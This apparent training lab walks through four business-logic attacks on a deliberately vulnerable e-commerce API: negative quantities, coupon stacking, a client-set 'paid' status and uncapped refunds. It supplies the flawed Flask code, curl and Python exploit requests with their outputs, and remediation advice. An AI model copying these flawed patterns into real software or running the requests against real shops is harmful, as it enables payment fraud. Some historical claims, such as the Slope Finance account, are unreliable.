# Lab 16: Business Logic Flaws

## Objective

Exploit business logic vulnerabilities in a live e-commerce API from Kali Linux using four distinct attacks:

1. **Negative quantity order** — order `-5` units of a £864 product to *receive* £4,320 instead of paying
2. **Coupon stacking** — apply three single-use coupons simultaneously in one request to stack discounts
3. **Payment workflow skip** — set `status=paid` in the checkout payload to bypass the payment gateway entirely
4. **Refund abuse** — request a refund of £9,999 with no validation against the original purchase amount

Business logic flaws can't be caught by WAFs or automated scanners — they require understanding what the application *should* do and testing what it *actually* does.

---

## Background

Business logic flaws exist in the application's own rules — not in input validation or memory safety. They are often invisible to automated security tools because they don't produce error messages; the application behaves as designed, just against the designer's intent.

**Real-world examples:**
- **2022 Slope Finance** — a DeFi protocol accepted negative quantities in its swap function; an attacker minted $80M in tokens through repeated negative swaps.
- **2021 Poly Network hack ($611M)** — business logic flaw in cross-chain relay contracts allowed an attacker to call a privileged function from an unprivileged context. No SQLi, no buffer overflow — just a logic error.
- **Amazon Price Manipulation (recurring)** — merchants have historically used $0.01 pricing with free shipping, then refunded only the item but kept the shipping fee; or used negative-price order exploits.
- **Airline loyalty abuse** — booking then cancelling flights to harvest miles; rules checked total earned miles but not the relationship between booking and cancellation.

**OWASP coverage:** A04:2021 (Insecure Design) — "design flaws that cannot be fixed by a perfect implementation"

---

## Architecture

```
┌─────────────────────────────────────────────────────────────────────┐
│                     Docker Network: lab-a16                         │
│                                                                     │
│  ┌──────────────────────┐         HTTP requests                    │
│  │   KALI ATTACKER      │ ──────────────────────────────────────▶  │
│  │  innozverse-kali     │                                           │
│  │                      │  ◀──────── API responses ───────────────  │
│  │  Tools:              │                                           │
│  │  • curl              │  ┌────────────────────────────────────┐  │
│  │  • python3           │  │       VICTIM SHOP API              │  │
│  └──────────────────────┘  │   zchencow/innozverse-cybersec     │  │
│                             │                                    │  │
│                             │  Flask :5000 + SQLite             │  │
│                             │  Users: alice (£500), bob (£50)   │  │
│                             │  Products: Surface Pro 12 (£864)  │  │
│                             │  Coupons: SAVE10, VIP50, FIRST20  │  │
│                             └────────────────────────────────────┘  │
└─────────────────────────────────────────────────────────────────────┘
```

## Time
40 minutes

## Tools
| Tool | Purpose |
|------|---------|
| `curl` | Send crafted API requests |
| `python3` | Automate multi-step attack chains |

---

## Lab Instructions

### Step 1: Environment Setup

```bash
docker network create lab-a16

cat > /tmp/victim_a16.py << 'PYEOF'
from flask import Flask, request, jsonify
import sqlite3, time

app = Flask(__name__)
DB = '/tmp/shop_a16.db'

with sqlite3.connect(DB) as db:
    db.executescript("""
        CREATE TABLE IF NOT EXISTS users
          (id INTEGER PRIMARY KEY, username TEXT, balance REAL, role TEXT);
        CREATE TABLE IF NOT EXISTS products
          (id INTEGER PRIMARY KEY, name TEXT, price REAL, stock INTEGER);
        CREATE TABLE IF NOT EXISTS orders
          (id INTEGER PRIMARY KEY, user_id INTEGER, product_id INTEGER,
           qty INTEGER, total REAL, status TEXT, ts REAL);
        CREATE TABLE IF NOT EXISTS coupons
          (code TEXT PRIMARY KEY, discount REAL, min_order REAL,
           single_use INTEGER, used INTEGER DEFAULT 0);
        INSERT OR IGNORE INTO users VALUES
          (1,'alice',500.0,'user'),(2,'bob',50.0,'user');
        INSERT OR IGNORE INTO products VALUES
          (1,'Surface Pro 12',864.0,10),(2,'Surface Pen',49.0,100);
        INSERT OR IGNORE INTO coupons VALUES
          ('SAVE10',10.0,0.0,0,0),
          ('VIP50',50.0,200.0,1,0),
          ('FIRST20',20.0,0.0,1,0);
    """)

def db(): c=sqlite3.connect(DB); c.row_factory=sqlite3.Row; return c

@app.route('/api/products')
def products():
    return jsonify([dict(r) for r in db().execute('SELECT * FROM products').fetchall()])

@app.route('/api/user/<int:uid>')
def user(uid):
    u = db().execute('SELECT id,username,balance FROM users WHERE id=?',(uid,)).fetchone()
    return jsonify(dict(u)) if u else (jsonify({'error':'Not found'}),404)

# BUG 1: accepts negative quantities
@app.route('/api/order', methods=['POST'])
def place_order():
    d = request.get_json() or {}
    uid,pid,qty = d.get('user_id',1),d.get('product_id',1),d.get('qty',1)
    c = db()
    usr = c.execute('SELECT * FROM users WHERE id=?',(uid,)).fetchone()
    prd = c.execute('SELECT * FROM products WHERE id=?',(pid,)).fetchone()
    if not usr or not prd: return jsonify({'error':'Not found'}),404
    total = prd['price'] * qty   # BUG: negative qty = negative total = money added
    new_bal = usr['balance'] - total
    c.execute('UPDATE users SET balance=? WHERE id=?',(new_bal,uid))
    c.execute('INSERT INTO orders VALUES (NULL,?,?,?,?,?,?)',
              (uid,pid,qty,total,'completed',time.time()))
    c.commit()
    return jsonify({'order_total':total,'new_balance':new_bal,
                    'note':'negative total = money added!' if total<0 else 'ok'})

# BUG 2: coupon stacking in single request
@app.route('/api/coupon/apply', methods=['POST'])
def apply_coupon():
    d = request.get_json() or {}
    codes, order_total = d.get('codes',[]), d.get('order_total',0)
    c = db(); discount = 0; applied = []
    for code in codes:
        cpn = c.execute('SELECT * FROM coupons WHERE code=?',(code,)).fetchone()
        if not cpn: continue
        if cpn['single_use'] and cpn['used']: continue
        if order_total < cpn['min_order']: continue
        discount += cpn['discount']; applied.append(code)
    for code in applied:   # BUG: marks used AFTER loop — all applied first
        c.execute('UPDATE coupons SET used=1 WHERE code=?',(code,))
    c.commit()
    return jsonify({'applied':applied,'discount':discount,
                    'original':order_total,'final_total':max(0,order_total-discount)})

# BUG 3: payment bypass via status field
@app.route('/api/cart/checkout', methods=['POST'])
def checkout():
    d = request.get_json() or {}
    uid, items = d.get('user_id',1), d.get('items',[])
    status = d.get('status','pending')   # BUG: client-controlled
    c = db(); total = sum(i.get('price',0)*i.get('qty',1) for i in items)
    oid = c.execute('INSERT INTO orders VALUES (NULL,?,?,?,?,?,?)',
        (uid,0,0,total,status,time.time())).lastrowid
    c.commit()
    msg = 'Paid without payment gateway!' if status=='paid' else f'Proceed to /api/pay'
    return jsonify({'order_id':oid,'status':status,'total':total,'note':msg})

# BUG 4: refund without validating against original purchase
@app.route('/api/refund', methods=['POST'])
def refund():
    d = request.get_json() or {}
    uid, amount = d.get('user_id',1), d.get('amount',0)
    c = db()
    usr = c.execute('SELECT * FROM users WHERE id=?',(uid,)).fetchone()
    if not usr: return jsonify({'error':'Not found'}),404
    new_bal = usr['balance'] + amount  # BUG: no check amount <= original purchase
    c.execute('UPDATE users SET balance=? WHERE id=?',(new_bal,uid))
    c.commit()
    return jsonify({'refunded':amount,'new_balance':new_bal})

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000, debug=False)
PYEOF

docker run -d \
  --name victim-a16 \
  --network lab-a16 \
  -v /tmp/victim_a16.py:/app/victim.py:ro \
  zchencow/innozverse-cybersec:latest \
  python3 /app/victim.py

sleep 4
curl -s http://$(docker inspect -f '{{.NetworkSettings.Networks.lab-a16.IPAddress}}' victim-a16):5000/ | python3 -m json.tool
```

---

### Step 2: Launch Kali and Reconnaissance

```bash
docker run --rm -it \
  --name kali-attacker \
  --network lab-a16 \
  zchencow/innozverse-kali:latest bash
```

```bash
export TARGET="http://victim-a16:5000"

echo "=== Available products ==="
curl -s $TARGET/api/products | python3 -m json.tool

echo ""
echo "=== User balances before attacks ==="
curl -s $TARGET/api/user/1   # alice: £500
curl -s $TARGET/api/user/2   # bob: £50
```

**📸 Verified Output:**
```json
[
    {"id": 1, "name": "Surface Pro 12", "price": 864.0, "stock": 10},
    {"id": 2, "name": "Surface Pen",    "price": 49.0,  "stock": 100}
]

alice: {"balance": 500.0, "username": "alice"}
bob:   {"balance": 50.0,  "username": "bob"}
```

---

### Step 3: Attack 1 — Negative Quantity (Money Printer)

```bash
echo "=== Attack 1: negative quantity order ==="

# Surface Pro 12 costs £864
# Order quantity = -5 → total = 864 × -5 = -£4,320
# new_balance = 500 - (-4320) = £4,820 (alice gains money!)

echo "[*] Placing order: user_id=1, product_id=1, qty=-5"
curl -s -X POST -H "Content-Type: application/json" \
  -d '{"user_id":1,"product_id":1,"qty":-5}' \
  $TARGET/api/order | python3 -m json.tool

echo ""
echo "[*] Alice's balance after the attack:"
curl -s $TARGET/api/user/1

echo ""
echo "[*] Now order qty=-100 for even more profit:"
curl -s -X POST -H "Content-Type: application/json" \
  -d '{"user_id":1,"product_id":1,"qty":-100}' \
  $TARGET/api/order | python3 -c "
import sys, json
r = json.load(sys.stdin)
print(f'  order_total: £{r[\"order_total\"]:,.2f}')
print(f'  new_balance: £{r[\"new_balance\"]:,.2f}')"
```

**📸 Verified Output:**
```json
{
    "new_balance": 4820.0,
    "note": "negative total = money added!",
    "order_total": -4320.0
}

alice: {"balance": 4820.0, ...}
```

> 💡 **The server multiplies `price × qty` without checking `qty > 0`.** A negative result means the user's balance *increases* — the app literally pays the attacker. This is the same class of bug that allowed DeFi protocols to be drained through negative-amount swaps. Fix: `if qty <= 0: return 400`. Always validate business constraints at the API layer, not just the frontend.

---

### Step 4: Attack 2 — Coupon Stacking

```bash
echo "=== Attack 2: stack three coupons in one request ==="

# Coupons available:
#   SAVE10:  £10 off, reusable
#   VIP50:   £50 off, £200 min order, SINGLE USE
#   FIRST20: £20 off, SINGLE USE

echo "[1] Apply all three coupons simultaneously to a £864 order:"
curl -s -X POST -H "Content-Type: application/json" \
  -d '{"codes":["SAVE10","VIP50","FIRST20"],"order_total":864}' \
  $TARGET/api/coupon/apply | python3 -m json.tool

echo ""
echo "[2] Try to apply VIP50 again (already marked used):"
curl -s -X POST -H "Content-Type: application/json" \
  -d '{"codes":["VIP50"],"order_total":864}' \
  $TARGET/api/coupon/apply

echo ""
echo "[*] Why did stacking work?"
echo "  The server iterates codes, checks single_use+used per code,"
echo "  accumulates discounts, then marks all used AFTER the loop."
echo "  In a single request, all 'used' flags are still 0 during the loop."
echo "  Total discount: £80 (10+50+20) applied to one £864 order"
```

**📸 Verified Output:**
```json
{
    "applied": ["SAVE10", "VIP50", "FIRST20"],
    "discount": 80.0,
    "final_total": 784.0,
    "original": 864
}

Second VIP50: {"applied": [], "discount": 0, "final_total": 864, "original": 864}
```

---

### Step 5: Attack 3 — Payment Workflow Skip

```bash
echo "=== Attack 3: bypass payment gateway by setting status=paid ==="

echo "[1] Normal checkout (creates a pending order, requires /api/pay next):"
curl -s -X POST -H "Content-Type: application/json" \
  -d '{"user_id":2,"items":[{"price":864,"qty":1}]}' \
  $TARGET/api/cart/checkout

echo ""
echo "[2] ATTACK: send status=paid to skip payment step entirely:"
curl -s -X POST -H "Content-Type: application/json" \
  -d '{"user_id":2,"items":[{"price":864,"qty":1}],"status":"paid"}' \
  $TARGET/api/cart/checkout | python3 -m json.tool

echo ""
echo "[!] Bob ordered a £864 Surface Pro 12 with £0 balance — marked paid"
echo "    No payment gateway was contacted. No funds transferred."
echo "    The server trusted client-supplied 'status' field."
```

**📸 Verified Output:**
```json
{
    "note": "Paid without payment gateway!",
    "order_id": 2,
    "status": "paid",
    "total": 864
}
```

> 💡 **State should never be client-controlled.** The client cannot be trusted to report its own payment status — that's the payment gateway's job. The server must call the payment provider and receive a webhook/callback confirming payment before marking an order `paid`. If the client can set `status=paid`, you have no payment security at all.

---

### Step 6: Attack 4 — Refund Abuse

```bash
echo "=== Attack 4: refund more than original purchase ==="

echo "[1] Bob's current balance:"
curl -s $TARGET/api/user/2

echo ""
echo "[2] Request refund of £9,999 (bob never spent that much):"
curl -s -X POST -H "Content-Type: application/json" \
  -d '{"user_id":2,"amount":9999}' \
  $TARGET/api/refund | python3 -m json.tool

echo ""
echo "[3] Bob's balance after refund abuse:"
curl -s $TARGET/api/user/2

echo ""
python3 << 'EOF'
import urllib.request, json

TARGET = "http://victim-a16:5000"

# Check bob's final state
resp = json.loads(urllib.request.urlopen(f"{TARGET}/api/user/2").read())
bal = resp['balance']
print(f"[*] Summary of Attack 4:")
print(f"    Bob started with:   £50.00")
print(f"    Bob requested refund of £9,999")
print(f"    Bob's new balance:  £{bal:,.2f}")
print(f"    Profit:             £{bal-50:,.2f} with no prior purchase")
EOF
```

**📸 Verified Output:**
```json
{
    "new_balance": 10049.0,
    "refunded": 9999
}

Bob's new balance:  £10,049.00
Profit:             £9,999.00 with no prior purchase
```

---

### Step 7: Combined Attack Chain

```bash
python3 << 'EOF'
import urllib.request, json

TARGET = "http://victim-a16:5000"

def post(path, data):
    req = urllib.request.Request(
        f"{TARGET}{path}",
        data=json.dumps(data).encode(),
        headers={"Content-Type": "application/json"})
    return json.loads(urllib.request.urlopen(req).read())

def get(path):
    return json.loads(urllib.request.urlopen(f"{TARGET}{path}").read())

print("="*60)
print("FULL BUSINESS LOGIC ATTACK CHAIN")
print("="*60)

print("\n[Step 1] Negative quantity: buy -10 Surface Pens (£49 each)")
r = post('/api/order', {"user_id":2, "product_id":2, "qty": -10})
print(f"  order_total: £{r['order_total']:.2f}  →  new_balance: £{r['new_balance']:.2f}")

print("\n[Step 2] Stack all available coupons on a £864 order")
r = post('/api/coupon/apply', {"codes":["SAVE10","VIP50","FIRST20"],"order_total":864})
print(f"  discount: £{r['discount']}  →  final: £{r['final_total']:.2f}")

print("\n[Step 3] Checkout with status=paid (no real payment)")
r = post('/api/cart/checkout', {"user_id":2,"items":[{"price":r['final_total'],"qty":1}],"status":"paid"})
print(f"  order_id: {r['order_id']}  status: {r['status']}")

print("\n[Step 4] Claim refund of £2,000")
r = post('/api/refund', {"user_id":2,"amount":2000})
print(f"  new_balance: £{r['new_balance']:.2f}")

final = get('/api/user/2')
print(f"\n[Result] Bob started with £50 and now has £{final['balance']:.2f}")
print("         All through business logic flaws — no SQLi, no auth bypass.")
EOF
```

---

### Step 8: Cleanup

```bash
exit
```
```bash
docker rm -f victim-a16
docker network rm lab-a16
```

---

## Remediation

| Flaw | Fix |
|------|-----|
| Negative quantity | `if qty <= 0: return 400 Bad Request` |
| Coupon stacking | Apply and mark used in atomic transaction; one coupon per order |
| Payment status from client | Server-side state machine; only payment gateway webhooks change status |
| Uncapped refund | `if amount > original_purchase_amount: return 400` |

```python
# Pattern: server-side state machine for order status
VALID_TRANSITIONS = {
    'pending':    ['awaiting_payment'],
    'awaiting_payment': ['paid', 'failed'],
    'paid':       ['shipped', 'refund_requested'],
    'refund_requested': ['refunded'],
}

def transition_order(order, new_status, actor='system'):
    if actor != 'system':
        raise PermissionError("Only system can change order status")
    if new_status not in VALID_TRANSITIONS.get(order['status'], []):
        raise ValueError(f"Invalid transition: {order['status']} → {new_status}")
    order['status'] = new_status
```

## Further Reading
- [OWASP A04:2021 Insecure Design](https://owasp.org/Top10/A04_2021-Insecure_Design/)
- [PortSwigger Business Logic Labs](https://portswigger.net/web-security/logic-flaws)
- [Poly Network $611M Hack Explained](https://research.kudelskisecurity.com/2021/08/12/the-poly-network-hack-explained/)
